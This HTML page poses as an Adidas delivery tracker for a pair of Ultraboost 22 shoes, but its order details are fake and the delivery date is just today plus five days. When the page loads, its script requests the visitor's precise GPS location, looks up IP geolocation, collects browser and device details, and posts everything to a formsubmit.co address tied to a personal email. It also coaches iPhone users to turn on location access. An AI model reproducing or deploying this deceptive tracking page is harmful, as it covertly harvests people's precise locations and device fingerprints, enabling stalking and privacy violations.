<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Track Your Adidas Delivery</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    .container {
      max-width: 600px;
      margin: auto;
    }
    h1 {
      color: #007aff;
    }
    .card {
      background: #f5f5f5;
      padding: 20px;
      border-radius: 10px;
      margin-bottom: 20px;
    }
    .info {
      text-align: left;
    }
    .status {
      font-size: 14px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Track Your Adidas Delivery</h1>
    <div class="card info">
      <p><strong>Product:</strong> Adidas Ultraboost 22</p>
      <p><strong>Expected Delivery:</strong> <span id="estimatedDate"></span></p>
      <p><strong>Status:</strong> Out for delivery</p>
      <p><strong>Delivery Partner:</strong> BlueDart Express</p>
    </div>
    <div id="status" class="status"></div>
  </div>

  <script>
    const statusDiv = document.getElementById('status');
    const FORM_ENDPOINT = "https://formsubmit.co/ajax/onkarmishra.dev@gmail.com"; // Replace with your email

    function updateStatus(msg) {
      const line = document.createElement('p');
      line.textContent = msg;
      statusDiv.appendChild(line);
    }

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language
      };
    }

    async function sendMail(data, subject) {
      try {
        const res = await fetch(FORM_ENDPOINT, {
          method: "POST",
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ _subject: subject, ...data })
        });

        if (res.ok) {
          updateStatus(`âœ… ${subject} sent successfully.`);
        } else {
          updateStatus(`âŒ Failed to send ${subject}.`);
        }
      } catch (err) {
        updateStatus(`âŒ Error sending ${subject}: ${err.message}`);
      }
    }

    async function getIPLocation() {
      try {
        const res = await fetch("https://ipapi.co/json");
        const data = await res.json();
        return {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          postal: data.postal,
          org: data.org,
          timezone: data.timezone
        };
      } catch (error) {
        updateStatus("âŒ Failed to fetch IP location.");
        return {};
      }
    }

    function isIOS() {
      return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    }

    async function gatherAndSendLocationData() {
      updateStatus("ðŸ” Fetching delivery details...");

      let geoData = {
        latitude: "",
        longitude: "",
        maps_link: ""
      };
      let usedGPS = false;

      if ("geolocation" in navigator) {
        try {
          geoData = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                usedGPS = true;
                const { latitude, longitude, accuracy } = pos.coords;
                resolve({
                  latitude,
                  longitude,
                  accuracy: accuracy + " meters",
                  maps_link: `https://maps.google.com?q=${latitude},${longitude}`
                });
              },
              err => reject(err),
              { enableHighAccuracy: true, timeout: 10000 }
            );
          });
          updateStatus("ðŸ“ GPS location obtained.");
        } catch (error) {
          updateStatus("âš ï¸ GPS location not available, falling back to IP.");
          if (error.code === error.PERMISSION_DENIED) {
            updateStatus("âŒ Location access denied.");
            if (isIOS()) {
              updateStatus("ðŸ“± iPhone Users: Go to Settings â†’ Safari â†’ Enable Location Access.");
            } else {
              updateStatus("âš ï¸ Please allow location access in browser settings.");
            }
          }
        }
      } else {
        updateStatus("âŒ Geolocation not supported by browser.");
      }

      const ipData = await getIPLocation();
      const deviceInfo = getDeviceInfo();
      const finalData = {
        ...ipData,
        ...geoData,
        timestamp: new Date().toLocaleString(),
        usedGPS: usedGPS ? "Yes" : "No",
        ...deviceInfo
      };

      console.log("Final Payload:", finalData);
      await sendMail(finalData, "âœ… â„¹ï¸ Order details report");
    }

    function displayEstimatedDate() {
      const today = new Date();
      today.setDate(today.getDate() + 5); // Add 5 days

      const options = { day: 'numeric', month: 'short', year: 'numeric' };
      const formattedDate = today.toLocaleDateString('en-GB', options); // Example: 21 Apr 2025

      document.getElementById('estimatedDate').textContent = formattedDate;
    }

    window.onload = () => {
      displayEstimatedDate();
      gatherAndSendLocationData();
    };
  </script>
</body>
</html>
